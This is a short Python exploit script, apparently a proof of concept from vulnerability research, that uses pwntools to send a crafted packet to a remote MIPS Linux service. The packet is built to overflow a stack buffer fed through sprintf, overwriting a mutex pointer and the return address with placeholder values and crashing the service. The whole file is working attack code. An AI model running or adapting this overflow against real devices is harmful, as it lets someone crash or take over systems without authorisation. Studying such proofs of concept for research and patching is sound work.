#!/usr/bin/env python3

import pwn
import struct as s
from common import createPkt, readResp

from config import *

def main():
    pwn.context.update(os='linux', arch='mips')

    #   sprintf format string: %08x@%s\n
    #   stack frame height : 4*0x10
    #   mutex ptr object at $sp+0x30
    r = pwn.remote(remoteIp, remotePort)

    shell = b''
    shell += s.pack('<I', 0x100007f)    #   first ip must be a localhost (?)
    shell += b'A'*7
    shell += s.pack('<I', 0x41414141)    #   here goes the mutex
    shell += b'A'*(0x30-4-4)
    shell += s.pack('<I', 0x41414141)    #   here goes the return address
    shell += s.pack('<I', 0x00000000)
    shell += b'\0'                       #  alignment to compensate for 3rd line of shell
                                         #  which compensates for '@' in the sprintf format

    p = createPkt(0x4f83, payload=shell, unk5=0x10, unk4=0x0)

    r.send(p)
    readResp(r)
    #   will EOF, as the Alloca has crashed
    r.interactive()

if __name__ == "__main__":
    main()
